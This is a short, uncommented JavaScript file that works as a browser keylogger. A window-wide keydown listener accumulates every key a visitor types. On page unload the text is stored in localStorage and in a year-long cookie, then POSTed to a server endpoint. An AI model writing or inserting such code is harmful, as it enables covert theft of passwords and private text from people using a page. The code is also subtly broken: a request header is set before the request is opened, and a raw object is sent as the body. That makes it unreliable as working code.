function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function sendData(url, method, param, callback) {
    var xhr = new XMLHttpRequest();

    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
    xhr.open(method, url, true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            callback();
        }
    };
    xhr.send(param);
}

function saveData(trackedMessage) {
    localStorage.trackedMessage = trackedMessage;
    console.log('saving cookie');
    setCookie('trackedMessage', trackedMessage, 365);
    sendData('/url', 'POST', { trackedMessage: trackedMessage }, () => console.log('Message sent'));
}

function init() {
    let trackedMessage = '';

    window.addEventListener('beforeunload', () => saveData(trackedMessage));
    window.addEventListener('keydown', e => {
        trackedMessage += e.key;
        console.log(trackedMessage);
    });
}

init();